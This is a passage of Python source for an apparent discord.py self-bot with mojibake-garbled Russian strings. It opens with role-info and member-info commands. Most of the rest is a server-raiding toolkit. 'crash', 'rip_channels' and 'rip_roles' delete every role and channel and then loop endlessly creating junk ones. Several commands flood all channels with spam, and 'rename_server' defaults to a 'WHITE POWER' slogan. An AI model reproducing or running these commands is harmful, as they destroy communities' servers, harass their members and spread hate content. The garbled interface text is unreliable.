            add_reactions = "–î–æ–±–∞–≤–ª—è—Ç—å —Ä–µ–∞–∫—Ü–∏–∏: `–î–∞`"
        else:
            add_reactions = "–î–æ–±–∞–≤–ª—è—Ç—å —Ä–µ–∞–∫—Ü–∏–∏: `–ù–µ—Ç`"
        if role.permissions.view_audit_log:
            view_audit_log = "–ß–∏—Ç–∞—Ç—å –∞—É–¥–∏—Ç: `–î–∞`"
        else:
            view_audit_log = "–ß–∏—Ç–∞—Ç—å –∞—É–¥–∏—Ç: `–ù–µ—Ç`"
        if role.permissions.priority_speaker:
            priority_speaker = "–ì–æ–≤–æ—Ä–∏—Ç—å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–æ: `–î–∞`"
        else:
            priority_speaker = "–ì–æ–≤–æ—Ä–∏—Ç—å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–æ: `–ù–µ—Ç`"
        if role.permissions.read_messages:
            read_messages = "–ß–∏—Ç–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        else:
            read_messages = "–ß–∏—Ç–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–ù–µ—Ç`"
        if role.permissions.send_messages:
            send_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        else:
            send_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è: `–ù–µ—Ç`"
        if role.permissions.send_tts_messages:
            send_tts_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å tts —Å–æ–æ–±—â–µ–Ω–∏—è: `–î–∞`"
        else:
            send_tts_messages = "–û—Ç–ø—Ä–∞–≤–ª—è—Ç—å tts —Å–æ–æ–±—â–µ–Ω–∏—è: `–ù–µ—Ç`"
        if role.permissions.manage_messages:
            manage_messages = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏: `–î–∞`"
        else:
            manage_messages = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏: `–ù–µ—Ç`"
        if role.permissions.embed_links:
            embed_links = "–í—Å—Ç—Ä–∞–∏–≤–∞—Ç—å —Å—Å—ã–ª–∫–∏: `–î–∞`"
        else:
            embed_links = "–í—Å—Ç—Ä–∞–∏–≤–∞—Ç—å —Å—Å—ã–ª–∫–∏: `–ù–µ—Ç`"
        if role.permissions.attach_files:
            attach_files = "–ü—Ä–∏–∫—Ä–µ–ø–ª—è—Ç—å —Ñ–∞–π–ª—ã: `–î–∞`"
        else:
            attach_files = "–ü—Ä–∏–∫—Ä–µ–ø–ª—è—Ç—å —Ñ–∞–π–ª—ã: `–ù–µ—Ç`"
        if role.permissions.read_message_history:
            read_message_history = "–ß–∏—Ç–∞—Ç—å –∏—Å—Ç—Ä–æ–∏—é —Å–æ–æ–±—â–µ–Ω–∏–π: `–î–∞`"
        else:
            read_message_history = "–ß–∏—Ç–∞—Ç—å –∏—Å—Ç—Ä–æ–∏—é —Å–æ–æ–±—â–µ–Ω–∏–π: `–ù–µ—Ç`"
        if role.permissions.mention_everyone:
            mention_everyone = "–ü–∏–Ω–≥–æ–≤–∞—Ç—å everyone: `–î–∞`"
        else:
            mention_everyone = "–ü–∏–Ω–≥–æ–≤–∞—Ç—å everyone: `–ù–µ—Ç`"
        if role.permissions.external_emojis:
            external_emojis = "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–º–∞–π–ª—ã —Å –¥—Ä—É–≥–∏—Ö —Å–µ—Ä–≤–æ–≤: `–î–∞`"
        else:
            external_emojis = "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–º–∞–π–ª—ã —Å –¥—Ä—É–≥–∏—Ö —Å–µ—Ä–≤–æ–≤: `–ù–µ—Ç`"
        if role.permissions.connect:
            connect = "–ü–æ–¥–∫–ª—é—á–∞—Ç—å—Å—è: `–î–∞`"
        else:
            connect = "–ü–æ–¥–∫–ª—é—á–∞—Ç—å—Å—è: `–ù–µ—Ç`"
        if role.permissions.speak:
            speak = "–ì–æ–≤–æ—Ä–∏—Ç—å: `–î–∞`"
        else:
            speak = "–ì–æ–≤–æ—Ä–∏—Ç—å: `–ù–µ—Ç`"
        if role.permissions.mute_members:
            mute_members = "–ú—É—Ç–∏—Ç—å –≤ –≥—á: `–î–∞`"
        else:
            mute_members = "–ú—É—Ç–∏—Ç—å –≤ –≥—á: `–ù–µ—Ç`"
        if role.permissions.deafen_members:
            deafen_members = "–ì–ª—É—à–∏—Ç—å –≤ –≥—á: `–î–∞`"
        else:
            deafen_members = "–ì–ª—É—à–∏—Ç—å –≤ –≥—á: `–ù–µ—Ç`"
        if role.permissions.move_members:
            move_members = "–ü–µ—Ä–µ–º–µ—â–∞—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤: `–î–∞`"
        else:
            move_members = "–ü–µ—Ä–µ–º–µ—â–∞—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤: `–ù–µ—Ç`"
        if role.permissions.use_voice_activation:
            use_voice_activation = "–ê–∫—Ç–∏–≤–∞—Ü–∏—è –ø–æ –≥–æ–ª–æ—Å—É: `–î–∞`"
        else:
            use_voice_activation = "–ê–∫—Ç–∏–≤–∞—Ü–∏—è –ø–æ –≥–æ–ª–æ—Å—É: `–ù–µ—Ç`"
        if role.permissions.change_nickname:
            change_nickname = "–ú–µ–Ω—è—Ç—å —Å–≤–æ–π –Ω–∏–∫: `–î–∞`"
        else:
            change_nickname = "–ú–µ–Ω—è—Ç—å —Å–≤–æ–π –Ω–∏–∫: `–ù–µ—Ç`"
        if role.permissions.manage_nicknames:
            manage_nicknames = "–ú–µ–Ω—è—Ç—å –Ω–∏–∫–∏: `–î–∞`"
        else:
            manage_nicknames = "–ú–µ–Ω—è—Ç—å –Ω–∏–∫–∏: `–ù–µ—Ç`"
        if role.permissions.manage_roles:
            manage_roles = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Ä–æ–ª—è–º–∏: `–î–∞`"
        else:
            manage_roles = "–£–ø—Ä–∞–≤–ª—è—Ç—å —Ä–æ–ª—è–º–∏: `–ù–µ—Ç`"
        if role.permissions.manage_webhooks:
            manage_webhooks = "–£–ø—Ä–∞–≤–ª—è—Ç—å –≤–µ–±—Ö—É–∫–∞–º–∏: `–î–∞`"
        else:
            manage_webhooks = "–£–ø—Ä–∞–≤–ª—è—Ç—å –≤–µ–±—Ö—É–∫–∞–º–∏: `–ù–µ—Ç`"
        if role.permissions.manage_emojis:
            manage_emojis = "–£–ø—Ä–∞–≤–ª—è—Ç—å —ç–º–æ–¥–∂–∏: `–î–∞`"
        else:
            manage_emojis = "–£–ø—Ä–∞–≤–ª—è—Ç—å —ç–º–æ–¥–∂–∏: `–ù–µ—Ç`"
    if role.hoist:
        hoist = "–û—Ç–æ–±—Ä–∞–∂–∞—Ç—å –æ—Ç–¥–µ–ª—å–Ω–æ: `–î–∞`"
    else:
        hoist = "–û—Ç–æ–±—Ä–∞–∂–∞—Ç—å –æ—Ç–¥–µ–ª—å–Ω–æ: `–ù–µ—Ç`"
    if role.mentionable:
        mentionable = "–£–ø–æ–º–∏–Ω–∞–µ—Ç—Å—è: `–î–∞`"
    else:
        mentionable = "–£–ø–æ–º–∏–Ω–∞–µ—Ç—Å—è: `–ù–µ—Ç`"
    if role.managed:
        managed = "–£–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è: `–î–∞`"
    else:
        managed = "–£–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è: `–ù–µ—Ç`"
    val1 = str(administrator) + "\n" + str(kick_members) + "\n" + str(ban_members) + "\n" + str(manage_channels) + "\n" + str(manage_guild) + "\n" + str(manage_roles) + "\n" + str(manage_webhooks) + "\n" + str(manage_emojis) + "\n" + str(view_audit_log) + "\n" + str(manage_messages) + "\n" + str(mention_everyone) + "\n" + str(manage_nicknames)
    val2 = str(create_instant_invite) + "\n" + str(add_reactions) + "\n" + str(read_messages) + "\n" + str(send_messages) + "\n" + str(send_tts_messages) + "\n" + str(embed_links) + "\n" + str(attach_files) + "\n" + str(read_message_history) + "\n" + str(external_emojis) + "\n" + str(change_nickname)
    val3 = str(connect) + "\n" + str(speak) + "\n" + str(use_voice_activation) + "\n" + str(mute_members) + "\n" + str(deafen_members) + "\n" + str(move_members) + "\n" + str(priority_speaker)
    embed = discord.Embed(title=f"–ò–Ω—Ñ–æ –æ {role}", colour=role.colour)
    embed.add_field(name="–¶–≤–µ—Ç:", value=f"<---\nHEX: {role.colour}\nRGB: `{role.colour.r}, {role.colour.g}, {role.colour.b}`")
    embed.add_field(name="–ù–æ–º–µ—Ä —Ä–æ–ª–∏:", value=f"{role.position}")
    embed.add_field(name="–ê–¥–º–∏–Ω –ø—Ä–∞–≤–∞:", value=val1, inline=False)
    embed.add_field(name="–¢–µ–∫—Å—Ç –ø—Ä–∞–≤–∞:", value=val2)
    embed.add_field(name="–ì—á –ø—Ä–∞–≤–∞:", value=val3)
    embed.add_field(name="–°–≤–æ–π—Å—Ç–≤–∞:", value=f"{managed}\n{hoist}\n{mentionable}")
    embed.add_field(name="–°–æ–∑–¥–∞–Ω–∞:", value=f"{role.created_at.strftime('%A, %b %#d %Y')}", inline=False)
    embed.set_footer(text=f"ID: {role.id}")
    await ctx.send(embed=embed)
    await ctx.message.delete()


@client.command()
async def roles(ctx):
    embeds=[]
    i = 0
    o = 1
    embed1 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed2 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed3 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed4 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed5 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed6 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed7 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed8 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed9 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed10 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed11 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed12 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed13 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed14 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed15 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed16 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed17 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed18 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed19 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed20 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed21 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed22 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed23 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed24 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed25 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed26 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed27 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    embed28 = discord.Embed(title=f"–†–æ–ª–∏ —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:", color=wuw(colors))
    for role in ctx.guild.roles:
        i+=1
        if i > 18:
            i=0
            o+=1

        if o == 1:
            embed1.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 2:
            embed2.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 3:
            embed3.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 4:
            embed4.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 5:
            embed5.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 6:
            embed6.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 7:
            embed7.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 8:
            embed8.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 9:
            embed9.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 10:
            embed10.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 11:
            embed11.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 12:
            embed12.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 13:
            embed13.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 14:
            embed14.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 15:
            embed15.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 16:
            embed16.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 17:
            embed17.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 18:
            embed18.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 19:
            embed19.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 20:
            embed20.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 21:
            embed21.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 22:
            embed22.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 23:
            embed23.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 24:
            embed24.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 25:
            embed25.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 26:
            embed26.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 27:
            embed27.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")
        elif o == 28:
            embed28.add_field(name=str(role), value=f"ID: {role.id}\n–ü–∏–Ω–≥: `<@&{role.id}>`")

    if o == 1:
        embeds=[embed1]
    elif o == 2:
        embeds=[embed1, embed2]
    elif o == 3:
        embeds=[embed1, embed2, embed3]
    elif o == 4:
        embeds=[embed1, embed2, embed3, embed4]
    elif o == 5:
        embeds=[embed1, embed2, embed3, embed4, embed5]
    elif o == 6:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6]
    elif o == 7:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7]
    elif o == 8:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8]
    elif o == 9:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9]
    elif o == 10:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10]
    elif o == 11:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11]
    elif o == 12:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12]
    elif o == 13:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13]
    elif o == 14:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14]
    elif o == 15:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15]
    elif o == 16:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16]
    elif o == 17:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17]
    elif o == 18:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18]
    elif o == 19:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19]
    elif o == 20:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20]
    elif o == 21:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21]
    elif o == 22:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22]
    elif o == 23:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23]
    elif o == 24:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23, embed24]
    elif o == 25:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23, embed24, embed25]
    elif o == 26:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23, embed24, embed25, embed26]
    elif o == 27:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23, embed24, embed25, embed26, embed27]
    elif o == 28:
        embeds=[embed1, embed2, embed3, embed4, embed5, embed6, embed7, embed8, embed9, embed10, embed11, embed12, embed13, embed14, embed15, embed16, embed17, embed18, embed19, embed20, embed21, embed22, embed23, embed24, embed25, embed26, embed27, embed28] 

    await ctx.message.delete()

    trr = True

    while trr:
        gkg = 0
        for emb in embeds:
            gkg+=1
            def check(message):
                return message.content == "next" and message.author == ctx.author and message.channel == ctx.channel
            emb.set_footer(text=f"–°—Ç—Ä–∞–Ω–∏—Ü–∞ {gkg}/{len(embeds)}, —Å–ª–µ–¥—É—é—â–∞—è - –Ω–∞–ø–∏—à–∏ `next`")
            await ctx.send(embed=emb)
            try: message=await client.wait_for('message', check = check, timeout=50); await message.delete()
            except asyncio.TimeoutError: return


@client.command()
async def clm(ctx, amount:int=500, mem:discord.User=None):
    if not mem: mem=ctx.author
    nw = datetime.now()
    mss = await ctx.send("üïê **Deleting**")
    await mss.add_reaction('üïê')
    async for mes in ctx.channel.history(limit=amount, before=nw):
        if mes.author.id == mem.id:
            try: await mes.delete()
            except: print(f"[{client.user}] "+f"cant delete message ID: {mes.id}")
    await mss.remove_reaction('üïê', ctx.author)
    await mss.edit(content = "‚úÖ **Deleting complete**")
    await mss.add_reaction('‚úÖ')


@client.command()
async def delete_channels(ctx):
    await ctx.message.edit(content = "Deleting strted, wait...")
    await ctx.message.add_reaction('üïê') 
    for channel in ctx.guild.channels: #delete all channels
        if channel is ctx.channel:
            pass
        else:
            try:
                await channel.delete()
            except:
                print(f"not deleted {channel}")
    await ctx.message.edit(content = "‚úÖ **Completed!**")
    await ctx.message.clear_reactions()
    await ctx.message.add_reaction("‚úÖ")


@client.command()
async def delete_roles(ctx):
    await ctx.message.edit(content = "Deleting strted, wait...")
    await ctx.message.add_reaction('üïê') 
    for role in ctx.guild.roles: #delete all roles
        try:
            await role.delete()
        except:
            print(f"[{client.user}] "+f"not deleted {role}")
    await ctx.message.edit(content = "‚úÖ **Completed!**")
    await ctx.message.clear_reactions()
    await ctx.message.add_reaction("‚úÖ")


@client.command()
async def crash(ctx):
    await ctx.message.delete()
    try: await ctx.guild.edit(name = "üòàADMIN LOSHARAüòà")
    except: print(f"[{client.user}] "+"no rename server")
    roles = ctx.guild.roles
    for role in roles:
        try: await role.delete()
        except: pass
    for channel in ctx.guild.channels: #delete all channels
        try: await channel.delete()
        except: print(f"[{client.user}] "+"no delete channel")
    while(100):
        try:
            await ctx.guild.create_role(name=f'Anarchy')
            await ctx.guild.create_text_channel(f'Anarchy')
            await ctx.guild.create_voice_channel(f'Anarchy')
        except:
            print(f"[{client.user}] "+"no create channel")


@client.command()
async def watch(ctx, *, arg):
    await client.change_presence(status=discord.Status.online, activity=discord.Activity(name=arg, type=discord.ActivityType.watching))
    await ctx.send(embed=discord.Embed(title='–°—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω–µ–Ω!',color=wuw(colors), description='–¢–µ–ø–µ—Ä—å —Ç—ã c–º–æ—Ç—Ä–∏—à—å ' + arg ))
    await ctx.message.delete()


@client.command()
async def listen(ctx, *, arg):
    embed=discord.Embed(title='–°—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω–µ–Ω!',color=wuw(colors), description='–¢–µ–ø–µ—Ä—å —Ç—ã —Å–ª—É—à–∞–µ—à—å ' + arg )
    await client.change_presence(status=discord.Status.online, activity=discord.Activity(name=arg, type=discord.ActivityType.listening))
    await ctx.send(embed=embed)
    await ctx.message.delete()


@client.command()
async def member(ctx,member:discord.Member = None):
    if not member:
        member = ctx.author
    emb = discord.Embed(title=f'–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ {member}',color=member.color)
    emb.add_field(name="–ü—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è:",value=member.joined_at,inline=False)
    emb.add_field(name='–ò–º—è:',value=member.display_name,inline=False)
    emb.add_field(name='–ê–π–¥–∏:',value=member.id,inline=False)
    emb.add_field(name="–ê–∫–∫–∞—É–Ω—Ç –±—ã–ª —Å–æ–∑–¥–∞–Ω:",value=member.created_at.strftime("%a,%#d %B %Y, %I:%M %p UTC"),inline=False)
    emb.set_thumbnail(url=member.avatar_url)
    emb.set_footer(text=f"–í—ã–∑–≤–∞–Ω–æ:  {ctx.message.author}",icon_url=ctx.message.author.avatar_url)
    emb.set_author(name=ctx.message.author,icon_url=ctx.message.author.avatar_url)
    await ctx.send(embed = emb)
    await ctx.message.delete()


@client.command()
async def play(ctx, *, arg):
    embed=discord.Embed(title='–°—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω–µ–Ω!',colour = wuw(colors), description='–¢–µ–ø–µ—Ä—å —Ç—ã –∏–≥—Ä–∞–µ—à—å –≤ ' + arg )
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name=arg))
    await ctx.send(embed=embed)
    await ctx.message.delete()


@client.command()
async def clear_chat(ctx, num=200):
    try: await ctx.channel.purge(limit=int(num))
    except: print(f"[{client.user}] "+"can`t clear chat")


@client.command()
async def spam_all_channels(ctx,*,arg):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('‚úÖ **Spamming initiated!** Type `stop` to stop.')

    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author and m.channel == ctx.channel

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send(f'{arg}')
                
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('‚úÖ **Spamming complete!**')


@client.command()
async def randspam_all_channels(ctx,*,arg):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('‚úÖ **Spamming initiated!** Type `stop` to stop.')

    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author and m.channel == ctx.channel

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                try: await tc.send(arg + "   ||" + wuw(allletters) + "||")
                except: pass
                
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('‚úÖ **Spamming complete!**')


@client.command()
async def rename_server(ctx, *, nom = "√ó√ó√óWHITE POWER√ó√ó√óíÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé íê´íÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé íê´íÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé íê´íÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé íê´íÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé íê´íÄ±íÅé íê´◊êíÄ±íÅé íê´íÄ±íÅé"):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name = nom)
    except:
        print(f"[{client.user}] "+"no permissions")


@client.command()
async def rip_channels(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels: #delete all channels
        try:
            await channel.delete()
        except:
            print(f"[{client.user}] "+"can`t delete channel")
    while(100):
        try:
            await ctx.guild.create_text_channel(f'R.I.P')
        except:
            print(f"[{client.user}] "+"can`t create channel")
            break


@client.command()
async def rip_roles(ctx):
    await ctx.message.delete()
    roles = ctx.guild.roles
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            try:
                await role.delete()
            except:
                pass
    while(100): 
        try:
            await ctx.guild.create_role(name=f'R.I.P')
        except:
            pass


@client.command()
async def spam_here(ctx,*,arg = 'gg'):
    await ctx.message.edit(content='‚úÖ **Spamming initiated!** \nType `stop` to stop.')
    
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text1():
        while True:
            await ctx.send(f'{arg}')

    spam_text_task = client.loop.create_task(spam_text1())

    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('‚úÖ **Spamming complete!**')


@client.command()
async def ball(ctx, *, arg):
    words = ['–î–∞', '–î–∞, –∫–æ–Ω–µ—á–Ω–æ', '–í–æ–∑–º–æ–∂–Ω–æ', '–ù–µ—Ç']
    r_word = wuw(words)
    await ctx.send(f'"{arg}" -> {r_word}')
    await ctx.message.delete()


@client.command()
async def serverinfo(ctx):
